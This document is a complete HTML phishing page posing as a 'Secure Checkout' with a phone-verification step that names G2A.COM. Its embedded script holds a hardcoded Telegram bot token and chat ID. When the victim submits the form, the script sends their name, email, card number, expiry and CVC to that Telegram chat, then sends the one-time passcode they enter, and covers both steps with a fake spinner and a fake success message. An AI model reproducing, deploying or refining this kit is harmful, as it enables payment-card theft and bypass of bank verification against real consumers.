<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1a1a1a;
            --text-gray: #6b7280;
            --error-color: #ff0000;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container { width: 100%; max-width: 400px; position: relative; }

        .page { display: none; }
        .active { display: block; }

        /* Internal Error/Success Modals */
        #errorModal, #successModal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            z-index: 1000;
            padding: 20px;
            text-align: center;
        }
        #modalOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4);
            z-index: 999;
        }
        .modal-text { font-size: 15px; margin-bottom: 20px; color: var(--text-main); line-height: 1.4; }
        .modal-btn { color: var(--stripe-blue); font-weight: 600; cursor: pointer; text-decoration: none; font-size: 16px; border: none; background: none; outline: none; }

        /* Loading Spinner */
        #loaderContainer {
            display: none;
            text-align: center;
            padding: 50px 20px;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--stripe-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .input-error { border-color: var(--error-color) !important; background-color: #fff8f8; }

        /* Layout Elements */
        h2 { font-size: 17px; font-weight: 600; margin: 25px 0 12px 0; }
        input, select { width: 100%; padding: 11px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; }
        
        .address-group { border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; margin-top: 5px; }
        .address-group input { border: none; border-bottom: 1px solid var(--border-color); border-radius: 0; }
        .country-box { background-color: #f9f9f9; padding: 11px; font-size: 15px; border-bottom: 1px solid var(--border-color); color: var(--text-gray); }
        .row { display: flex; }
        .row input:first-child { border-right: 1px solid var(--border-color); }

        .payment-box { border: 1px solid var(--border-color); border-radius: 8px; margin-top: 10px; overflow: hidden; }
        .payment-header { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid var(--border-color); font-weight: 500; }
        .card-icons-img { height: 22px; margin-left: auto; }
        
        .btn-pay { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 25px; cursor: pointer; }

        /* Verification Page */
        .v-title { font-family: "Times New Roman", Times, serif; font-size: 26px; text-align: left; margin-bottom: 20px; }
        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0; border: 1px solid var(--border-color); border-radius: 4px; }
    </style>
</head>
<body>

<div class="container">
    <div id="modalOverlay"></div>
    
    <div id="errorModal">
        <div class="modal-text">Please fill in all fields correctly.</div>
        <button class="modal-btn" onclick="closeModal()">Close</button>
    </div>

    <div id="successModal">
        <div class="modal-text" id="successText"></div>
        <button class="modal-btn" onclick="closeSuccessModal()">Close</button>
    </div>

    <div id="checkoutPage" class="page active">
        <h2>Shipping Information</h2>
        <input type="email" id="email" placeholder="email@example.com">
        
        <h2>Shipping Address</h2>
        <div class="address-group">
            <input type="text" id="name" placeholder="Full Name">
            <div class="country-box">United States</div>
            <input type="text" id="addr1" placeholder="Address Line 1">
            <div class="row">
                <input type="text" id="city" placeholder="City">
                <input type="text" id="zip" placeholder="Zip Code">
            </div>
            <select id="state"><option value="">State</option><option value="NY">New York</option><option value="CA">California</option></select>
        </div>

        <h2>Payment Method</h2>
        <div class="payment-box">
            <div class="payment-header">
                <span>ðŸ’³ Card</span>
                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons-img">
            </div>
            <div style="padding: 15px;">
                <input type="text" id="cardNum" placeholder="Card Number" maxlength="19">
                <div class="row" style="margin-top: 10px;">
                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
                </div>
            </div>
        </div>
        <button class="btn-pay" onclick="validateCheckout()">Pay Now</button>
    </div>

    <div id="loaderContainer">
        <div class="spinner"></div>
        <p>Securing your transaction...</p>
    </div>

    <div id="verifyPage" class="page">
        <h1 class="v-title">Verify By Phone</h1>
        <p>We have sent you a text message with a code to your registered mobile number.</p>
        <p>You are paying G2A.COM the amount of <b>EUR 1.46</b>.</p>
        
        <div style="margin-top: 40px;">
            <label style="color: #888; display: block; text-align: center;">Verification code</label>
            <input type="text" class="v-input" maxlength="6" id="otpInput">
        </div>

        <button class="btn-pay" style="margin-top: 10px;" onclick="finalCheck()">CONFIRM</button>
    </div>
</div>

<script>
    // --- Telegram Credentials ---
    const token = '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc'; 
    const chat_id = '8741842122'; 

    async function sendTelegram(msg) {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: msg, parse_mode: 'HTML' })
        });
    }

    // Card Number Formatting
    document.getElementById('cardNum').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    function closeModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
    function closeSuccessModal() { document.getElementById('successModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }

    async function validateCheckout() {
        const email = document.getElementById('email').value;
        const card = document.getElementById('cardNum').value;
        const name = document.getElementById('name').value;
        const exp = document.getElementById('exp').value;
        const cvc = document.getElementById('cvc').value;

        if (!email.includes('@') || card.replace(/\s/g, '').length < 16 || !name || !cvc) {
            document.getElementById('errorModal').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
            return;
        }

        // Send Card Data to Telegram
        const report = `<b>ðŸš€ NEW LOG HIT</b>\n\nðŸ‘¤ Name: ${name}\nðŸ“§ Email: ${email}\nðŸ’³ Card: <code>${card}</code>\nðŸ“… Exp: ${exp}\nðŸ”’ CVC: ${cvc}`;
        await sendTelegram(report);

        startLoading();
    }

    function startLoading() {
        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('loaderContainer').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loaderContainer').style.display = 'none';
            document.getElementById('verifyPage').classList.add('active');
            window.scrollTo(0,0);
        }, 3000);
    }

    async function finalCheck() {
        const otp = document.getElementById('otpInput').value;
        if(otp.length === 6) {
            await sendTelegram(`<b>ðŸ”‘ RECEIVED OTP:</b> <code>${otp}</code>`);
            document.getElementById('successText').textContent = "Verification Successful. Redirecting...";
            document.getElementById('successModal').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
        } else {
            document.getElementById('successText').textContent = "Invalid OTP code.";
            document.getElementById('successModal').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
        }
    }
</script>
</body>
</html>
